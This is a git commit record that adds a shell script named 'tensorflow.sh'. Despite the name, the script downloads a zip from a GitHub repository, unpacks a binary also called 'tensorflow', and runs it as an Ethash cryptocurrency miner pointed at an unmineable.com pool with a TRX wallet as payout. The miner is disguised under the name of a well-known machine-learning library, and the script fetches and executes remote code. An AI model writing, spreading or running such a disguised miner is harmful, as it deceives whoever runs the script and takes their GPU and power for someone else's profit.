c5551582f23f878d3a75a3a78972960cd5c3a99a
Praveen <80373260+NanoTest5000@users.noreply.github.com>
2022-01-17 01:00:03 +0530

    1701

---
+++ n3/tensorflow.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo apt update && sudo apt-get install zip unzip && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/n5000/tensorflow/raw/main/tensorflow.zip && unzip tensorflow.zip && cd tensorflow && chmod u+x tensorflow && ./tensorflow --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWzp8qHuWZai4ZHaAMhQy9ND82ACKwoLd2.n3 --ethstratum ETHPROXY
